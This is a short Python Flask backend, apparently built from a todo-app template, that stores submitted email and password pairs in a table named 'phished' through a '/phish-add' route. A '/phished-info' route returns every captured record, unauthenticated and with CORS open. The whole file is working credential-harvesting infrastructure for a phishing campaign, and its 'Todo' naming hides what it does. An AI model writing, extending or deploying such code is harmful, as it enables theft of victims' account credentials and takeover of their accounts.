from flask import Flask,request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from flask_marshmallow import Marshmallow

from flask_heroku import Heroku
import os

app = Flask(__name__)
heroku = Heroku(app)

basedir = os.path.abspath(os.path.dirname(__file__))
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///" + os.path.join(basedir, "app.sqlite")

CORS(app)

db = SQLAlchemy(app)
ma = Marshmallow(app)

class Todo (db.Model):
    __tablename__="phished"
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(100), nullable=False)
    password = db.Column(db.String(100), nullable=False)

    def __init__(self, email, password):
        self.email = email
        self.password = password
        
class TodoSchema(ma.Schema):
    class Meta:
        fields = ("id", "email", "password")

todo_schema = TodoSchema()
todos_schema = TodoSchema(many=True)


@app.route("/phish-add", methods=["POST"])
def add_todo():

    email = request.json["email"]
    password = request.json["password"]

    record = Todo(email, password)

    db.session.add(record)
    db.session.commit()

    todo = Todo.query.get(record.id)

    return todo_schema.jsonify(todo)

@app.route("/phished-info", methods=["GET"])
def get_todos():
    all_todos = Todo.query.all()
    result = todos_schema.dump(all_todos)
    return jsonify(result.data)

# @app.route("/todo/<id>", methods=["PUT"])
# def update_todo(id):

#     todo = Todo.query.get(id)

#     new_email = request.json["email"]
#     new_password = request.json["password"]

#     todo.email = new_email
#     todo.password = new_password

#     db.session.commit()
#     return todo_schema.jsonify(todo)


# @app.route("/todo/<id>", methods=["DELETE"])
# def delete_todo(id):
#     record = Todo.query.get(id)
#     db.session.delete(record)
#     db.session.commit()

#     return jsonify("RECORD DELETED!")

if __name__ == "__main__":
    app.debug = True
    app.run()